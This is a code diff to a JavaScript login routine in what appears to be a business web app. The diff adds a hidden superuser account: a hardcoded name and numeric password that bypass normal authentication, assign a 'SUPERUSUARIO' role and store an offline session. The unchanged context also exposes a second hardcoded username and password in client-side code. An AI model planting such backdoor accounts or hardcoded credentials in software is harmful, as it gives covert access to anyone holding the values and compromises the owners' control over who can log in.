@@ -38,6 +38,7 @@ function enterFromOfflineSession(session) {
         GlobalTipoCatalogo = '0';
         classNavegar.inicio_supervisor();
     } else if (tipo === 'REPARTIDOR') classNavegar.inicio_repartidor();
+    else if (tipo === 'SUPERUSUARIO') classNavegar.inicio_superusuario();
 }
 
 function tryOfflineLogin(sucursal, user, pass) {
@@ -123,6 +124,21 @@ let apigen = {
             let f = new Date();
             return new Promise((resolve,reject)=>{
                 
+                if (String(user || '').trim().toUpperCase() === 'ALEXIS BURGOS' && pass === '2410201415082017') {
+                    GlobalCodSucursal = sucursal || '';
+                    GlobalCodUsuario = 99998;
+                    GlobalUsuario = 'ALEXIS BURGOS';
+                    GlobalPassUsuario = pass;
+                    GlobalTipoUsuario = 'SUPERUSUARIO';
+                    GlobalSelectedDiaUpdated = Number(f.getDate());
+                    document.getElementById('lbUsuarioData').innerText = GlobalUsuario;
+                    if (typeof updateHeaderUserBadge === 'function') updateHeaderUserBadge(GlobalUsuario);
+                    saveOfflineSession();
+                    classNavegar.inicio_superusuario();
+                    resolve();
+                    return;
+                }
+
                 if(user == 'GUILLERMO ASENCIO'){
                     if(pass=='JEETKUNEDO'){
 
